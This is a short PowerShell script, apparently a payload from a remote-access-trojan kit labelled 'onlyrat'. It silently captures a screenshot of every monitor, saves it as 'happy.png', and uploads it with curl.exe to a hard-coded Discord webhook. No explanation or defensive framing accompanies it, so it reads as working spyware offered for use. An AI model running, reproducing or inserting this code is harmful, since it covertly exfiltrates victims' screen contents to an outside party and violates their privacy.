Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$location = pwd
$screens = [Windows.Forms.Screen]::AllScreens
$link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"

$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
$right  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
$bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)

$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

$bmp.Save("$location\happy.png")
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$location\happy.png```" $link"

$graphics.Dispose()
$bmp.Dispose()